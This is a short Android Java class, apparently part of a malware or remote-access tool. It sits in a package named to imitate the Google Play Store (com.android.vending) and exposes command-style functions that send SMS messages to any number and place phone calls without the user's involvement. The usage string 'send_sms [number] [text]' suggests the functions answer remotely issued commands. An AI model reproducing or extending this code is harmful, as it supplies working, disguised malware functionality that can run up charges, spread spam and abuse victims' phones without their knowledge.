package com.android.vending.helper;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsManager;
public class Comms {
    public static String sendSms(Context c, String args) {
        try { String[] p = args.split("\\s+", 2); if (p.length < 2) return "Usage: send_sms [number] [text]"; SmsManager sm = SmsManager.getDefault(); sm.sendTextMessage(p[0], null, p[1], null, null); return "SMS sent to " + p[0]; }
        catch (Exception e) { return "SMS failed."; }
    }
    public static String makeCall(Context c, String number) {
        try { Intent i = new Intent(Intent.ACTION_CALL); i.setData(Uri.parse("tel:" + number)); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); c.startActivity(i); return "Calling " + number; }
        catch (Exception e) { return "Call failed."; }
    }
}
